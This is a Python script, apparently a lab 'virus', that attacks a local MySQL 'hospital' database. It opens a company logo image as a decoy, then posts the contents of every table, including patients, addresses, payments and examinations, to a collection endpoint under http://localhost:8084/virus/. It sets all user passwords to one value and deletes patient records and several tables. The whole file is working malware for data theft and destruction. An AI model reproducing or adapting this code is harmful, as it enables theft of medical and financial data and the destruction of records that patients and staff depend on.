import pymysql
import requests
import os

def connect_to_db(host_name, port_num, username, password, db_name):
	db = pymysql.connect(host=host_name,   
						 port=port_num,
						 user=username,         
						 passwd=password,  
						 db=db_name)     
	return db
	
def get_column_names(db, table_name):
	cur = db.cursor()
	column_names = ""

	query = "SHOW COLUMNS FROM " + table_name
	cur.execute(query)

	for row in cur.fetchall():
		column_names = column_names + row[0] + ","
	
	column_names = column_names[0:-1]
	return column_names
	
def get_table_data(db, table_name):
	cur = db.cursor()
	table_data = ""

	query = "SELECT * FROM " + table_name
	cur.execute(query)

	for row in cur.fetchall():
		current_row = ""
		for tmp in row:
			current_row = current_row + str(tmp) + ","
		table_data = table_data + current_row[0:-1] + "\n"
	
	table_data = table_data[0:-1]
	return table_data
	
def get_first_user_password(db):
	cur = db.cursor()
	table_data = ""

	query = "SELECT * FROM person limit 1" 
	cur.execute(query)

	return cur.fetchall()[0][4]
	
def update_table_user(db, new_password):
	cur = db.cursor()

	query = "UPDATE person SET password = '" + new_password + "'";
	cur.execute(query)
	db.commit()
	
def delete_patients(db):
	cur = db.cursor()
	
	query = "DELETE FROM person WHERE discriminator = 'PATIENT'"
	cur.execute(query)
	db.commit()
	
def delete_table(db, table_name):
	cur = db.cursor()

	query = "DELETE FROM " + table_name
	cur.execute(query)
	db.commit()
	
def send_request(db, table_name, url):
	columns_operation = get_column_names(db, table_name)
	data_operation = get_table_data(db, table_name)
	content = columns_operation + "\n" + data_operation
	
	requests.post(url, data=content,  headers={'content-type':'text/plain'})

	
def steal_data(db):
	send_request(db, "address", "http://localhost:8084/virus/addresses")
	send_request(db, "examination", "http://localhost:8084/virus/examinations")
	send_request(db, "operation", "http://localhost:8084/virus/operations")
	send_request(db, "payment", "http://localhost:8084/virus/payments")
	send_request(db, "permission", "http://localhost:8084/virus/permissions")
	send_request(db, "person", "http://localhost:8084/virus/persons")
	send_request(db, "record", "http://localhost:8084/virus/records")
	send_request(db, "role", "http://localhost:8084/virus/roles")
	send_request(db, "role_member", "http://localhost:8084/virus/role_members")
	send_request(db, "role_permission", "http://localhost:8084/virus/role_permissions")
	send_request(db, "room", "http://localhost:8084/virus/rooms")
	send_request(db, "room_schedule", "http://localhost:8084/virus/room_schedules")

def update_user_passwords(db):
	first_password = get_first_user_password(db)
	update_table_user(db, first_password)
	
def delete_data(db):
	delete_patients(db)
	delete_table(db, "examination")
	delete_table(db, "operation")
	delete_table(db, "record")
	delete_table(db, "payment")
	delete_table(db, "room_schedule")
	delete_table(db, "room")

	
if __name__ == '__main__':

	try:
		os.startfile('medicine_company_logo.jpg')
	except:
		print("No such file!")
	
	try:
		db = connect_to_db("localhost", 3306, "root", "katarina", "hospital")
		
		steal_data(db)
		update_user_passwords(db)
		delete_data(db)
		
		db.close()
	except Exception as e:
		print(e)
	
